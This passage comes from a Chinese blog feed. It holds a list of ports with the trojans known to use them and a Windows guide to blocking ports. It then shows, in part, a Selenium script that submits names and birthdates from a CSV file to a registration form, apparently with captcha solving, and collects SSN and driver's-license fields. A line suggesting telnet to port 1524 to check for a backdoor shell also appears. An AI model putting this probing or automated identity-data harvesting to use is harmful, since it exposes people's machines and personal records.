<p>端口：1500<br>服务：RPC client fixed port session queries<br>说明：RPC客户固定端口会话查询<br>端口：1503<br>服务：NetMeeting T.120<br>说明：NetMeeting T.120</p>
<p>端口：1524<br>服务：ingress<br>说明：许多攻击脚本将安装一个后门SHELL于这个端口，尤其是针对SUN系统中Sendmail和RPC服务漏洞的脚本。如果刚安装了 _blank”&gt;防火墙就看到在这个端口上的连接企图，很可能是上述原因。可以试试Telnet到用户的计算机上的这个端口，看看它是否会给你一个 SHELL。连接到600/pcserver也存在这个问题。</p>
<p>端口：1600<br>服务：issd<br>说明：木马Shivka-Burka开放此端口。</p>
<p>端口：1720<br>服务：NetMeeting<br>说明：NetMeeting H.233 call Setup。</p>
<p>端口：1731<br>服务：NetMeeting Audio Call Control<br>说明：NetMeeting音频调用控制。</p>
<p>端口：1807<br>服务：[NULL]<br>说明：木马SpySender开放此端口。</p>
<p>端口：1981<br>服务：[NULL]<br>说明：木马ShockRave开放此端口。</p>
<p>端口：1999<br>服务：cisco identification port<br>说明：木马BackDoor开放此端口。</p>
<p>端口：2000<br>服务：[NULL]<br>说明：木马GirlFriend 1.3、Millenium 1.0开放此端口。</p>
<p>端口：2001<br>服务：[NULL]<br>说明：木马Millenium 1.0、Trojan Cow开放此端口。</p>
<p>端口：2023<br>服务：xinuexpansion 4<br>说明：木马Pass Ripper开放此端口。</p>
<p>端口：2049<br>服务：NFS<br>说明：NFS程序常运行于这个端口。通常需要访问Portmapper查询这个服务运行于哪个端口。</p>
<p>端口：2115<br>服务：[NULL]<br>说明：木马Bugs开放此端口。</p>
<p>端口：2140、3150<br>服务：[NULL]<br>说明：木马Deep Throat 1.0/3.0开放此端口。</p>
<p>端口：2500<br>服务：RPC client using a fixed port session replication<br>说明：应用固定端口会话复制的RPC客户</p>
<p>端口：2583<br>服务：[NULL]<br>说明：木马Wincrash 2.0开放此端口。</p>
<p>端口：2801<br>服务：[NULL]<br>说明：木马Phineas Phucker开放此端口。</p>
<p>端口：3024、4092<br>服务：[NULL]<br>说明：木马WinCrash开放此端口。</p>
<p>端口：3128<br>服务：squid<br>说明：这是squid HTTP代理服务器的默认端口。攻击者扫描这个端口是为了搜寻一个代理服务器而匿名访问Internet。也会看到搜索其他代理服务器的端口8000、 8001、8080、8888。扫描这个端口的另一个原因是用户正在进入聊天室。其他用户也会检验这个端口以确定用户的机器是否支持代理。</p>
<p>端口：3129<br>服务：[NULL]<br>说明：木马Master Paradise开放此端口。</p>
<p>端口：3150<br>服务：[NULL]<br>说明：木马The Invasor开放此端口。</p>
<p>端口：3210、4321<br>服务：[NULL]<br>说明：木马SchoolBus开放此端口</p>
<p>端口：3333<br>服务：dec-notes<br>说明：木马Prosiak开放此端口</p>
<p>端口：3389<br>服务：超级终端<br>说明：WINDOWS 2000终端开放此端口。</p>
<p>端口：3700<br>服务：[NULL]<br>说明：木马Portal of Doom开放此端口</p>
<p>端口：3996、4060<br>服务：[NULL]<br>说明：木马RemoteAnything开放此端口</p>
<p>端口：4000<br>服务：QQ客户端<br>说明：腾讯QQ客户端开放此端口。</p>
<p>端口：4092<br>服务：[NULL]<br>说明：木马WinCrash开放此端口。</p>
<p>端口：4590<br>服务：[NULL]<br>说明：木马ICQTrojan开放此端口。</p>
<p>端口：5000、5001、5321、50505<br>服务：[NULL]<br>说明：木马blazer5开放5000端口。木马Sockets de Troie开放5000、5001、5321、50505端口。</p>
<p>端口：5400、5401、5402<br>服务：[NULL]<br>说明：木马Blade Runner开放此端口。</p>
<p>端口：5550<br>服务：[NULL]<br>说明：木马xtcp开放此端口。</p>
<p>端口：5569<br>服务：[NULL]<br>说明：木马Robo-Hack开放此端口。</p>
<p>端口：5632<br>服务：pcAnywere<br>说明：有时会看到很多这个端口的扫描，这依赖于用户所在的位置。当用户打开pcAnywere时，它会自动扫描局域网C类网以寻找可能的代理（这里的代理是指agent而不是proxy）。入侵者也会寻找开放这种服务的计算机。，所以应该查看这种扫描的源地址。一些搜寻pcAnywere的扫描包常含端口22的UDP数据包。</p>
<p>端口：5742<br>服务：[NULL]<br>说明：木马WinCrash1.03开放此端口。</p>
<p>端口：6267<br>服务：[NULL]<br>说明：木马广外女生开放此端口。</p>
<p>端口：6400<br>服务：[NULL]<br>说明：木马The tHing开放此端口。</p>
<p>端口：6670、6671<br>服务：[NULL]<br>说明：木马Deep Throat开放6670端口。而Deep Throat 3.0开放6671端口。</p>
<p>端口：6883<br>服务：[NULL]<br>说明：木马DeltaSource开放此端口。</p>
<p>端口：6969<br>服务：[NULL]<br>说明：木马Gatecrasher、Priority开放此端口。</p>
<p>端口：6970<br>服务：RealAudio<br>说明：RealAudio客户将从服务器的6970-7170的UDP端口接收音频数据流。这是由TCP-7070端口外向控制连接设置的。</p>
<p>端口：7000<br>服务：[NULL]<br>说明：木马Remote Grab开放此端口。</p>
<p>端口：7300、7301、7306、7307、7308<br>服务：[NULL]<br>说明：木马NetMonitor开放此端口。另外NetSpy1.0也开放7306端口。</p>
<p>端口：7323<br>服务：[NULL]<br>说明：Sygate服务器端。</p>
<p>端口：7626<br>服务：[NULL]<br>说明：木马Giscier开放此端口。</p>
<p>端口：7789<br>服务：[NULL]<br>说明：木马ICKiller开放此端口。<br>端口：8000<br>服务：OICQ<br>说明：腾讯QQ服务器端开放此端口。</p>
<p>端口：8010<br>服务：Wingate<br>说明：Wingate代理开放此端口。</p>
<p>端口：8080<br>服务：代理端口<br>说明：WWW代理开放此端口。</p>
<p>端口：9400、9401、9402<br>服务：[NULL]<br>说明：木马Incommand 1.0开放此端口。</p>
<p>端口：9872、9873、9874、9875、10067、10167<br>服务：[NULL]<br>说明：木马Portal of Doom开放此端口。</p>
<p>端口：9989<br>服务：[NULL]<br>说明：木马iNi-Killer开放此端口。</p>
<p>端口：11000<br>服务：[NULL]<br>说明：木马SennaSpy开放此端口。</p>
<p>端口：11223<br>服务：[NULL]<br>说明：木马Progenic trojan开放此端口。</p>
<p>端口：12076、61466<br>服务：[NULL]<br>说明：木马Telecommando开放此端口。</p>
<p>端口：12223<br>服务：[NULL]<br>说明：木马Hack’99 KeyLogger开放此端口。</p>
<p>端口：12345、12346<br>服务：[NULL]<br>说明：木马NetBus1.60/1.70、GabanBus开放此端口。</p>
<p>端口：12361<br>服务：[NULL]<br>说明：木马Whack-a-mole开放此端口。</p>
<p>端口：13223<br>服务：PowWow<br>说明：PowWow是Tribal Voice的聊天程序。它允许用户在此端口打开私人聊天的连接。这一程序对于建立连接非常具有攻击性。它会驻扎在这个TCP端口等回应。造成类似心跳间隔的连接请求。如果一个拨号用户从另一个聊天者手中继承了IP地址就会发生好象有很多不同的人在测试这个端口的情况。这一协议使用OPNG作为其连接请求的前4个字节。</p>
<p>端口：16969<br>服务：[NULL]<br>说明：木马Priority开放此端口。<br>端口：17027<br>服务：Conducent<br>说明：这是一个外向连接。这是由于公司内部有人安装了带有Conducent”adbot”的共享软件。Conducent”adbot”是为共享软件显示广告服务的。使用这种服务的一种流行的软件是Pkware。</p>
<p>端口：19191<br>服务：[NULL]<br>说明：木马蓝色火焰开放此端口。</p>
<p>端口：20000、20001<br>服务：[NULL]<br>说明：木马Millennium开放此端口。</p>
<p>端口：20034<br>服务：[NULL]<br>说明：木马NetBus Pro开放此端口。</p>
<p>端口：21554<br>服务：[NULL]<br>说明：木马GirlFriend开放此端口。</p>
<p>端口：22222<br>服务：[NULL]<br>说明：木马Prosiak开放此端口。</p>
<p>端口：23456<br>服务：[NULL]<br>说明：木马Evil FTP、Ugly FTP开放此端口。</p>
<p>端口：26274、47262<br>服务：[NULL]<br>说明：木马Delta开放此端口。</p>
<p>端口：27374<br>服务：[NULL]<br>说明：木马Subseven 2.1开放此端口。</p>
<p>端口：30100<br>服务：[NULL]<br>说明：木马NetSphere开放此端口。</p>
<p>端口：30303<br>服务：[NULL]<br>说明：木马Socket23开放此端口。</p>
<p>端口：30999<br>服务：[NULL]<br>说明：木马Kuang开放此端口。</p>
<p>端口：31337、31338<br>服务：[NULL]<br>说明：木马BO(Back Orifice)开放此端口。另外木马DeepBO也开放31338端口。</p>
<p>端口：31339<br>服务：[NULL]<br>说明：木马NetSpy DK开放此端口。</p>
<p>端口：31666<br>服务：[NULL]<br>说明：木马BOWhack开放此端口。</p>
<p>端口：33333<br>服务：[NULL]<br>说明：木马Prosiak开放此端口。</p>
<p>端口：34324<br>服务：[NULL]<br>说明：木马Tiny Telnet Server、BigGluck、TN开放此端口。</p>
<p>端口：40412<br>服务：[NULL]<br>说明：木马The Spy开放此端口。</p>
<p>端口：40421、40422、40423、40426、<br>服务：[NULL]<br>说明：木马Masters Paradise开放此端口。</p>
<p>端口：43210、54321<br>服务：[NULL]<br>说明：木马SchoolBus 1.0/2.0开放此端口。</p>
<p>端口：44445<br>服务：[NULL]<br>说明：木马Happypig开放此端口。</p>
<p>端口：50766<br>服务：[NULL]<br>说明：木马Fore开放此端口。</p>
<p>端口：53001<br>服务：[NULL]<br>说明：木马Remote Windows Shutdown开放此端口。</p>
<p>端口：65000<br>服务：[NULL]<br>说明：木马Devil 1.03开放此端口。</p>
<h3 id="下面是：系统常用的端口"><a href="#下面是：系统常用的端口" class="headerlink" title="下面是：系统常用的端口"></a>下面是：系统常用的端口</h3><p>7 UDP Echo 简单 TCP/IP 服务<br>9 TCP Discard 简单 TCP/IP 服务<br>9 UDP Discard 简单 TCP/IP 服务<br>13 TCP Daytime 简单 TCP/IP 服务<br>13 UDP Daytime 简单 TCP/IP 服务<br>17 TCP Quotd 简单 TCP/IP 服务<br>17 UDP Quotd 简单 TCP/IP 服务<br>19 TCP Chargen 简单 TCP/IP 服务<br>19 UDP Chargen 简单 TCP/IP 服务<br>20 TCP FTP 默认数据 FTP 发布服务<br>21 TCP FTP 控制 FTP 发布服务<br>21 TCP FTP 控制 应用层网关服务<br>23 TCP Telnet Telnet<br>25 TCP SMTP 简单邮件传输协议<br>25 UDP SMTP 简单邮件传输协议<br>25 TCP SMTP Exchange Server<br>25 UDP SMTP Exchange Server<br>42 TCP WINS 复制 Windows Internet 名称服务<br>42 UDP WINS 复制 Windows Internet 名称服务<br>53 TCP DNS DNS 服务器<br>53 UDP DNS DNS 服务器<br>53 TCP DNS Internet 连接_blank”&gt;防火墙/Internet 连接共享<br>53 UDP DNS Internet 连接_blank”&gt;防火墙/Internet 连接共享<br>67 UDP DHCP 服务器 DHCP 服务器<br>67 UDP DHCP 服务器 Internet 连接_blank”&gt;防火墙/Internet 连接共享<br>69 UDP TFTP 普通 FTP 后台程序服务<br>80 TCP HTTP Windows 媒体服务<br>80 TCP HTTP 万维网发布服务<br>80 TCP HTTP SharePoint Portal Server<br>88 TCP Kerberos Kerberos 密钥分发中心<br>88 UDP Kerberos Kerberos 密钥分发中心<br>102 TCP X.400 Microsoft Exchange MTA 堆栈<br>110 TCP POP3 Microsoft POP3 服务<br>110 TCP POP3 Exchange Server<br>119 TCP NNTP 网络新闻传输协议<br>123 UDP NTP Windows Time<br>123 UDP SNTP Windows Time<br>135 TCP RPC 消息队列<br>135 TCP RPC 远程过程调用<br>135 TCP RPC Exchange Server<br>137 TCP NetBIOS 名称解析 计算机浏览器<br>137 UDP NetBIOS 名称解析 计算机浏览器<br>137 TCP NetBIOS 名称解析 Server<br>137 UDP NetBIOS 名称解析 Server<br>137 TCP NetBIOS 名称解析 Windows Internet 名称服务<br>137 UDP NetBIOS 名称解析 Windows Internet 名称服务<br>137 TCP NetBIOS 名称解析 Net Logon<br>137 UDP NetBIOS 名称解析 Net Logon<br>137 TCP NetBIOS 名称解析 Systems Management Server 2.0<br>137 UDP NetBIOS 名称解析 Systems Management Server 2.0<br>138 UDP NetBIOS 数据报服务 计算机浏览器<br>138 UDP NetBIOS 数据报服务 信使<br>138 UDP NetBIOS 数据报服务 服务器<br>138 UDP NetBIOS 数据报服务 Net Logon<br>138 UDP NetBIOS 数据报服务 分布式文件系统<br>138 UDP NetBIOS 数据报服务 Systems Management Server 2.0<br>138 UDP NetBIOS 数据报服务 许可证记录服务<br>139 TCP NetBIOS 会话服务 计算机浏览器<br>139 TCP NetBIOS 会话服务 传真服务<br>139 TCP NetBIOS 会话服务 性能日志和警报<br>139 TCP NetBIOS 会话服务 后台打印程序<br>139 TCP NetBIOS 会话服务 服务器<br>139 TCP NetBIOS 会话服务 Net Logon<br>139 TCP NetBIOS 会话服务 远程过程调用定位器<br>139 TCP NetBIOS 会话服务 分布式文件系统<br>139 TCP NetBIOS 会话服务 Systems Management Server 2.0<br>139 TCP NetBIOS 会话服务 许可证记录服务<br>143 TCP IMAP Exchange Server<br>161 UDP SNMP SNMP 服务<br>162 UDP SNMP 陷阱出站 SNMP 陷阱服务<br>389 TCP LDAP 服务器 本地安全机构<br>389 UDP LDAP 服务器 本地安全机构<br>389 TCP LDAP 服务器 分布式文件系统<br>389 UDP LDAP 服务器 分布式文件系统<br>443 TCP HTTPS HTTP SSL<br>443 TCP HTTPS 万维网发布服务<br>443 TCP HTTPS SharePoint Portal Server<br>445 TCP SMB 传真服务<br>445 UDP SMB 传真服务<br>445 TCP SMB 后台打印程序<br>445 UDP SMB 后台打印程序<br>445 TCP SMB 服务器<br>445 UDP SMB 服务器<br>445 TCP SMB 远程过程调用定位器<br>445 UDP SMB 远程过程调用定位器<br>445 TCP SMB 分布式文件系统<br>445 UDP SMB 分布式文件系统<br>445 TCP SMB 许可证记录服务<br>445 UDP SMB 许可证记录服务<br>500 UDP IPSec ISAKMP IPSec 服务<br>515 TCP LPD TCP/IP 打印服务器<br>548 TCP Macintosh 文件服务器 Macintosh 文件服务器<br>554 TCP RTSP Windows 媒体服务<br>563 TCP NNTP over SSL 网络新闻传输协议<br>593 TCP RPC over HTTP 远程过程调用<br>593 TCP RPC over HTTP Exchange Server<br>636 TCP LDAP SSL 本地安全机构<br>636 UDP LDAP SSL 本地安全机构<br>993 TCP IMAP over SSL Exchange Server<br>995 TCP POP3 over SSL Exchange Server<br>1270 TCP MOM-Encrypted Microsoft Operations Manager 2000<br>1433 TCP SQL over TCP Microsoft SQL Server<br>1433 TCP SQL over TCP MSSQL$UDDI<br>1434 UDP SQL Probe Microsoft SQL Server<br>1434 UDP SQL Probe MSSQL$UDDI<br>1645 UDP 旧式 RADIUS Internet 身份验证服务<br>1646 UDP 旧式 RADIUS Internet 身份验证服务<br>1701 UDP L2TP 路由和远程访问<br>1723 TCP PPTP 路由和远程访问<br>1755 TCP MMS Windows 媒体服务<br>1755 UDP MMS Windows 媒体服务<br>1801 TCP MSMQ 消息队列<br>1801 UDP MSMQ 消息队列<br>1812 UDP RADIUS 身份验证 Internet 身份验证服务<br>1813 UDP RADIUS 计帐 Internet 身份验证服务<br>1900 UDP SSDP SSDP 发现服务<br>2101 TCP MSMQ-DC 消息队列<br>2103 TCP MSMQ-RPC 消息队列<br>2105 TCP MSMQ-RPC 消息队列<br>2107 TCP MSMQ-Mgmt 消息队列<br>2393 TCP OLAP Services 7.0 SQL Server：下层 OLAP 客户端支持<br>2394 TCP OLAP Services 7.0 SQL Server：下层 OLAP 客户端支持<br>2460 UDP MS Theater Windows 媒体服务<br>2535 UDP MADCAP DHCP 服务器<br>2701 TCP SMS 远程控制（控件） SMS 远程控制代理<br>2701 UDP SMS 远程控制（控件） SMS 远程控制代理<br>2702 TCP SMS 远程控制（数据） SMS 远程控制代理<br>2702 UDP SMS 远程控制（数据） SMS 远程控制代理<br>2703 TCP SMS 远程聊天 SMS 远程控制代理<br>2703 UPD SMS 远程聊天 SMS 远程控制代理<br>2704 TCP SMS 远程文件传输 SMS 远程控制代理<br>2704 UDP SMS 远程文件传输 SMS 远程控制代理<br>2725 TCP SQL 分析服务 SQL 分析服务器<br>2869 TCP UPNP 通用即插即用设备主机<br>2869 TCP SSDP 事件通知 SSDP 发现服务<br>3268 TCP 全局编录服务器 本地安全机构<br>3269 TCP 全局编录服务器 本地安全机构<br>3343 UDP 集群服务 集群服务<br>3389 TCP 终端服务 NetMeeting 远程桌面共享<br>3389 TCP 终端服务 终端服务<br>3527 UDP MSMQ-Ping 消息队列<br>4011 UDP BINL 远程安装<br>4500 UDP NAT-T 路由和远程访问<br>5000 TCP SSDP 旧事件通知 SSDP 发现服务<br>5004 UDP RTP Windows 媒体服务<br>5005 UDP RTCP Windows 媒体服务<br>42424 TCP ASP.Net 会话状态 ASP.NET 状态服务<br>51515 TCP MOM-Clear Microsoft Operations Manager 2000</p>
<h2 id="二、-关闭端口"><a href="#二、-关闭端口" class="headerlink" title="二、 关闭端口"></a>二、 关闭端口</h2><h3 id="限制端口防非法入侵-分享"><a href="#限制端口防非法入侵-分享" class="headerlink" title="限制端口防非法入侵[分享]"></a>限制端口防非法入侵[分享]</h3><p>一般来说，我们采用一些功能强大的反黑软件和防火墙来保证我们的系统安全，本文拟用一种简易的办法——通过限制端口来帮助大家防止非法入侵。</p>
<h3 id="非法入侵的方式"><a href="#非法入侵的方式" class="headerlink" title="非法入侵的方式"></a>非法入侵的方式</h3><p>　　简单说来，非法入侵的方式可粗略分为4种：<br>　　1、扫描端口，通过已知的系统Bug攻入主机。<br>　　2、种植木马，利用木马开辟的后门进入主机。<br>　　3、采用数据溢出的手段，迫使主机提供后门进入主机。<br>　　4、利用某些软件设计的漏洞，直接或间接控制主机。
　　</p>
<p>​        非法入侵的主要方式是前两种，尤其是利用一些流行的黑客工具，通过第一种方式攻击主机的情况最多、也最普遍；而对后两种方式来说，只有一些手段高超的黑客才利用，波及面并不广泛，而且只要这两种问题一出现，软件服务商很快就会提供补丁，及时修复系统。<br>　　因此，如果能限制前两种非法入侵方式，就能有效防止利用黑客工具的非法入侵。而且前两种非法入侵方式有一个共同点，就是通过端口进入主机。<br>　　端口就像一所房子（服务器）的几个门一样，不同的门通向不同的房间（服务器提供的不同服务）。我们常用的FTP默认端口为21，而WWW网页一般默认端口是80。但是有些马虎的网络管理员常常打开一些容易被侵入的端口服务，比如139等；还有一些木马程序，比如冰河、BO、广外等都是自动开辟一个您不察觉的端口。那么，只要我们把自己用不到的端口全部封锁起来，不就杜绝了这两种非法入侵吗？</p>
<h3 id="限制端口的方法"><a href="#限制端口的方法" class="headerlink" title="限制端口的方法"></a>限制端口的方法</h3><p>　　对于个人用户来说，您可以限制所有的端口，因为您根本不必让您的机器对外提供任何服务；而对于对外提供网络服务的服务器，我们需把必须利用的端口（比如WWW端口80、FTP端口21、邮件服务端口25、110等）开放，其他的端口则全部关闭。<br>　　这里，对于采用Windows 2000或者Windows XP的用户来说，不需要安装任何其他软件，可以利用“TCP/IP筛选”功能限制服务器的端口。具体设置如下：<br>　　1、右键点击“网上邻居”，选择“属性”，然后双击“本地连接”（如果是拨号上网用户，选择“我的连接”图标），弹出“本地连接状态”对话框。<br>　　2、点击[属性]按钮，弹出“本地连接 属性”，选择“此连接使用下列项目”中的“Internet协议（TCP/IP）”，然后点击[属性]按钮。<br>　　3、在弹出的“Internet协议（TCP/IP）”对话框中点击[高级]按钮。在弹出的“高级TCP/IP 设置”中，选择“选项”标签，选中“TCP/IP筛选”，然后点击[属性]按钮。<br>　　4、在弹出的“TCP/IP筛选”对话框里选择“启用TCP/IP筛选”的复选框，然后把左边“TCP端口”上的“只允许”选上。<br>　　这样，您就可以来自己添加或删除您的TCP或UDP或IP的各种端口了。<br>　　添加或者删除完毕，重新启动机器以后，您的服务器就被保护起来了。<br>　　最后，提醒个人用户，如果您只上网浏览的话，可以不添加任何端口。但是要利用一些网络联络工具，比如QQ的话，就要把“4000”这个端口打开，同理，如果发现某个常用的网络工具不能起作用的时候，请搞清它在您主机所开的端口，然后在“TCP /IP“里把此端口打开。</p>
]]></content>
      <categories>
        <category>服务器</category>
      </categories>
      <tags>
        <tag>端口</tag>
      </tags>
  </entry>
  <entry>
    <title>Google验证码实战</title>
    <url>//Google%E9%AA%8C%E8%AF%81%E7%A0%81%E5%AE%9E%E6%88%98</url>
    <content><![CDATA[<h1 id="Google验证码-打码"><a href="#Google验证码-打码" class="headerlink" title="Google验证码_打码"></a>Google验证码_打码</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.select <span class="keyword">import</span> Select</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">from</span> SeleniumGoogle <span class="keyword">import</span> SeleniumTest</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="comment"># Buster: Captcha Solver for Humans</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">valid_date</span>(<span class="params">timestr</span>):</span></span><br><span class="line">    nowTime_str = datetime.now().strftime(<span class="string">&#x27;%Y-%m-%d&#x27;</span>)</span><br><span class="line">    <span class="comment"># mktime参数为struc_time,将日期转化为秒，</span></span><br><span class="line">    e_time = time.mktime(time.strptime(nowTime_str, <span class="string">&quot;%Y-%m-%d&quot;</span>))</span><br><span class="line">    <span class="comment"># print(e_time)</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s_time = time.mktime(time.strptime(timestr, <span class="string">&#x27;%Y-%m-%d&#x27;</span>))</span><br><span class="line">        <span class="comment"># print(s_time)</span></span><br><span class="line">        <span class="comment"># 日期转化为int比较</span></span><br><span class="line">        diff = <span class="built_in">int</span>(s_time) - <span class="built_in">int</span>(e_time)</span><br><span class="line">        <span class="comment"># print(diff)</span></span><br><span class="line">        <span class="keyword">if</span> diff &gt;= <span class="number">0</span>:</span><br><span class="line">            is_true = <span class="literal">True</span></span><br><span class="line">            <span class="comment"># print(&#x27;True&#x27;)</span></span><br><span class="line">            <span class="keyword">return</span> is_true</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            is_true = <span class="literal">False</span></span><br><span class="line">            <span class="comment"># self.show_data.emit(&#x27;测试版本已不能试用！！！&#x27;)</span></span><br><span class="line">            <span class="comment"># print(&#x27;测试版本已不能试用！！！&#x27;)</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;False&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> is_true</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求方法</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">driver,url</span>):</span></span><br><span class="line">    data = <span class="string">&#x27;./sss.csv&#x27;</span></span><br><span class="line">    csv_data = csv.reader(<span class="built_in">open</span>(data, <span class="string">&#x27;r&#x27;</span>))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./&quot;</span>+<span class="string">&#x27;结果.csv&#x27;</span>, <span class="string">&quot;a&quot;</span>, newline=<span class="string">&#x27;&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;结果&quot;</span> + <span class="string">&#x27;.csv&#x27;</span> + <span class="string">&quot;   文件已创建...&quot;</span>)</span><br><span class="line">        fieldnames = [<span class="string">&quot;名&quot;</span>, <span class="string">&quot;中间名&quot;</span>, <span class="string">&quot;姓&quot;</span>, <span class="string">&quot;地址&quot;</span>, <span class="string">&quot;生日&quot;</span>, <span class="string">&quot;ssn&quot;</span>, <span class="string">&quot;驾照&quot;</span>,<span class="string">&quot;体重&quot;</span>]</span><br><span class="line">        f_csv = csv.DictWriter(f, fieldnames=fieldnames)</span><br><span class="line">        f_csv.writeheader()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> csv_data:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>,<span class="number">170</span>):</span><br><span class="line">                driver.get(url)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;已打开首页&quot;</span>)</span><br><span class="line">                driver.implicitly_wait(<span class="number">10</span>)</span><br><span class="line">                driver.execute_script(<span class="string">&quot;window.scrollTo(0,document.body.scrollHeight)&quot;</span>)</span><br><span class="line">                <span class="comment"># 点击apply  应用</span></span><br><span class="line">                driver.find_element_by_xpath(</span><br><span class="line">                    <span class="string">&#x27;//*[@id=&quot;main-content&quot;]/section/section/div/div/div/div[2]/div[1]/section/div/a&#x27;</span>).click()</span><br><span class="line">                driver.implicitly_wait(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 点击close</span></span><br><span class="line">                driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;divSystemMessage&quot;]/div/div/div[3]/button&#x27;</span>).click()</span><br><span class="line">                <span class="keyword">try</span>: <span class="comment"># 关掉第二个close</span></span><br><span class="line">                    driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;divnote&quot;]/div/div/div[3]/button&#x27;</span>).click()</span><br><span class="line">                    <span class="comment"># ActionChains(driver).move_by_offset(1298, 297).click().perform()  # 鼠标左键点击一律不</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">                <span class="comment"># 点击注册</span></span><br><span class="line">                driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;divRegister&quot;]/section/div/div/div/a&#x27;</span>).click()</span><br><span class="line">                driver.implicitly_wait(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 点击begin</span></span><br><span class="line">                driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;divStep1&quot;]/div[2]/div/span/a&#x27;</span>).click()</span><br><span class="line">                driver.implicitly_wait(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 下拉滚动条到底</span></span><br><span class="line">                driver.execute_script(<span class="string">&quot;window.scrollTo(0,document.body.scrollHeight)&quot;</span>)</span><br><span class="line">                time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># a = input(&quot;00000000000000：&quot;)</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># 下拉滚动条到底</span></span><br><span class="line">                driver.execute_script(<span class="string">&quot;window.scrollTo(document.body.scrollHeight,0)&quot;</span>)</span><br><span class="line">                time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 输入第一个last name</span></span><br><span class="line">                <span class="comment"># html = driver.page_source</span></span><br><span class="line">                <span class="comment"># soup = BeautifulSoup(html,&#x27;lxml&#x27;)</span></span><br><span class="line">                <span class="comment"># soup.select(&#x27;&#x27;)</span></span><br><span class="line">                lastname1 = driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;txtLastname&quot;]&#x27;</span>)</span><br><span class="line">                lastname1.click()</span><br><span class="line">                lastname1.send_keys(i[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 输入第一个生日</span></span><br><span class="line">                date1 = driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;txtDOB&quot;]&#x27;</span>)</span><br><span class="line">                date1.click()</span><br><span class="line">                date1.send_keys(i[<span class="number">8</span>])</span><br><span class="line">                driver.implicitly_wait(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="comment"># 输入第二个last name</span></span><br><span class="line">                lastname2 = driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;txtLastNameConfirm&quot;]&#x27;</span>)</span><br><span class="line">                lastname2.click()</span><br><span class="line">                lastname2.send_keys(i[<span class="number">2</span>])</span><br><span class="line">                driver.implicitly_wait(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="comment"># 输入第二个生日</span></span><br><span class="line">                date2 = driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;txtDOBConfirm&quot;]&#x27;</span>)</span><br><span class="line">                date2.click()</span><br><span class="line">                date2.send_keys(i[<span class="number">8</span>])</span><br><span class="line">                driver.implicitly_wait(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="comment"># 输入随机ID</span></span><br><span class="line">                ID = random.sample([<span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;k&#x27;</span>,</span><br><span class="line">                                    <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span 